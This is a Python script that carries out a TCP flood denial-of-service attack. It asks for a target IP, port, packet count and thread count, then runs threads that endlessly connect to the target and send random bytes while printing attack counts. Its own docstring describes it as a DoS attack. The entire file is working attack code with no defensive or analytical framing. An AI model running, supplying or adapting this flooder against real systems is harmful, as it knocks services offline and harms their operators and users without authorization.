import socket
import random
import threading

ip = str(input('[+] Target:'))
port = int(input('[+] Port:'))
pack = int(input('[+] Packet/s:'))
thread = int(input('[+] Threads:'))

def start():
    """
        Conducts a basic Denial-of-Service (DoS) attack on a specified target using TCP packets.

        Behavior:
        - Attempts to connect to the target IP and port, then sends a sequence of randomly generated packets.
        - Continuously sends packets in the specified amount per connection attempt.
        - Tracks and prints the number of connection attempts made to the target.
        - Closes the socket and prints a message upon encountering an error.

    """
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print('Attacking '+ip+' | Sent:'+str(xx))
        except:
            s.close()
            print('Done')

for x in range(thread):
    thred = threading.Thread(target = start)
    thred.start()
